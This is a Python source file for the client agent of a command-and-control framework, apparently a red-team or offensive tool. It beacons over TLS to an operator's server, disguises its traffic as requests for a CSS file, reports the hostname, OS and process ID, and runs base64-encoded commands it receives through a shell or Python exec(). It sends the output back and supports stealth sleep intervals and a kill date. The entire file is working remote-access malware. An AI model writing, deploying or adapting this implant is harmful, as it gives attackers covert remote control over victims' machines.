#!/usr/bin/env python3
# License: GPL-3.0

################################################
# Imports for Python 2/3 compatibility
################################################
try:
    from subprocess import check_output
except:
    from commands import getoutput as check_output
import ssl
import socket
from os import getpid
from time import sleep
from random import randint
from sys import exit, argv
from datetime import datetime
from platform import node, system, release
from threading import Thread
from base64 import b64decode, b64encode

################################################
# Client Config - Verify with C2 Server config
################################################
SERVER          = argv[1]
PORT            = int(argv[2])
AGENT_PAGE      = "/main.css"
SLEEP_TIME1     = 2
SLEEP_TIME2     = 5
SECRET_KEY      = '000000000000000116s92k48dss923j640s234v849c2001qi231d950g3s9df01esdr'
SSL_VERSION     = ssl.PROTOCOL_TLSv1
KILL_DATE       = datetime(2020,6,11)

################################################
# Client Default Info
################################################
HOSTNAME        = node().strip()
OS_VERSION      = system().strip() + release().strip()
PID             = getpid()
TYPE            = "python"
PROTOCOL        = "HTTPS"

################################################
# Client Request to C2
################################################
def cmd_formatter(send_data):
    # Put data in proper base64 format (really confusing)
    return b64encode(send_data.encode('utf-8')).decode('utf-8')

def request_headers(send_data):
    # Create HTTP(S) request headers
    data = "GET {0} HTTP/1.0\r\n".format(AGENT_PAGE)
    data += "Host: {}\r\n".format(SERVER)
    data += "User-Agent: Mozilla/5.0 (X11; Linux x86_64)\r\n"
    data += "Secret-Key: {}\r\n".format(SECRET_KEY)
    data += "Hostname: {}\r\n".format(HOSTNAME)
    data += "OS: {}\r\n".format(OS_VERSION)
    data += "PID: {}\r\n".format(PID)
    data += "TYPE: {}\r\n".format(TYPE)
    data += "PROTOCOL: {}\r\n".format(PROTOCOL)
    data += "Data: {}\r\n\r\n".format(cmd_formatter(send_data))
    return data

def http_request(send_data):
    try:
        # Send request
        if "-debug" in argv: print("[-->] Sending:\n {}".format(str(send_data)))
        # Craft Request Headers
        data = request_headers(send_data)
        # Create Socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # TLS Wrap Socket
        ssl_sock = ssl.wrap_socket(sock, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE,ssl_version=SSL_VERSION)
        # Socket Connect
        ssl_sock.connect((SERVER, PORT))
        # Send Data
        sock_send(ssl_sock, data)
        # Receive response
        x = sock_recv(ssl_sock)
        sock_close(ssl_sock)
        #if "-debug" in argv: print("\n[<--] Response:\n {}".format(str(x)))
        return x
    except Exception as e:
        #if "-debug" in argv: print("\n[!] agent_action exception hit:\n {}".format(str(e)))
        return False

def sock_close(sock):
    sock.close()
    del sock

def sock_send(sock, msg):
    sock.send(msg.encode('utf-8'))

def sock_recv(sock):
    buff_size = 1024
    data = b''
    try:
        while True:
            new =sock.recv(buff_size)
            data += new
            if len(str(new)) < buff_size:
                return data.decode('utf-8').rstrip('\n')
    except:
        return data.decode('utf-8').rstrip('\n')

################################################
# Parse Response from C2
################################################
def parse_response(data):
    #if "-debug" in argv: print("\n[*] Rcv Data: {}".format(data))
    # Parse data returned from C2 looking for cmd
    cmd = data.split('<body>')[1].split('</body>')[0].strip()
    if not cmd:
        return False
    return b64decode(cmd).decode('utf-8')

################################################
# Command Handler
################################################
def cmd_handler(cmd):
    # Global needed to modify var
    global KILL_DATE
    try:
        # Exits by changing kill data to destroy payload
        if cmd == "close":
            http_request("{} Closed.".format(HOSTNAME))
            KILL_DATE = datetime(int(2000), int(1), int(1))
            exit(0)

        # Change kill date: change_date year,month,day
        elif "change_date" in cmd:
            try:
                kd = cmd.split(" ")
                t = kd[1].split(",")
                KILL_DATE = datetime(int(t[0]),int(t[1]),int(t[2]))
                resp = "[+] kill date changed to {0}".format(KILL_DATE)
            except:
                resp = "[!] Unable to change kill date: {0}".format(KILL_DATE)

        # Change checkin intervals: stealth int1 int2
        elif "stealth" in cmd:
            try:
                t = cmd.split(" ")
                # Global needed to modify var
                global SLEEP_TIME1, SLEEP_TIME2
                SLEEP_TIME1 = int(t[1])
                SLEEP_TIME2 = int(t[2])
                resp = "[+] Sleep intverval changed to {0}-{1}".format(SLEEP_TIME1,SLEEP_TIME2)
            except:
                resp = "[*] Current sleep Interval: {0}-{1}".format(SLEEP_TIME1,SLEEP_TIME2)

        # execute command
        else:
            #if "-debug" in argv: print("\n[*] Executing: {}".format(cmd))
            tmp = CmdExec()
            if cmd.startswith("#Module"):
                t1 = Thread(target=tmp.mod_exec, args=(cmd,))
                t1.daemon = True
                t1.start()
                resp = tmp.cmd
            else:
                t1 = Thread(target=tmp.cmd_exec, args=(cmd,))
                t1.daemon=True
                t1.start()
                t2 = Thread(target=cmd_timout, args=(tmp,))
                t2.daemon = True
                t2.start()
                while tmp.running:
                    sleep(.001)
                resp = tmp.cmd
                del(tmp)
        # Send data back to C2
        http_request(resp)
    except Exception as e:
        #if "-debug" in argv: print("\n[!] Cmd_handler error: {}".str(e))
        http_request(str(e))

################################################
# Spawn New Thread to execute command
################################################
class CmdExec():
    def __init__(self):
        self.running = True

    def cmd_exec(self, cmd):
        try:
            self.cmd = check_output(cmd, shell=True).decode('utf-8')
        except Exception as e:
            self.cmd = str(e)
        self.running = False

    def mod_exec(self,cmd):
        try:
            self.cmd = "[+] Module Executed"
            exec(cmd)
        except:
            self.cmd = str(e)

def cmd_timout(class_obj):
    sleep(120)
    class_obj.running = False

################################################
# Client Main Loop
################################################
while KILL_DATE > datetime.now():
    try:
        # Check-in with C2 and response data & Execute command
        data = parse_response(http_request('check-in'))
        if data:
            cmd_handler(data)
    except KeyboardInterrupt:
        break
    except Exception as e:
        pass
    sleep(randint(SLEEP_TIME1, SLEEP_TIME2))

# Send close notification before exit
http_request('{0} Closed'.format(HOSTNAME))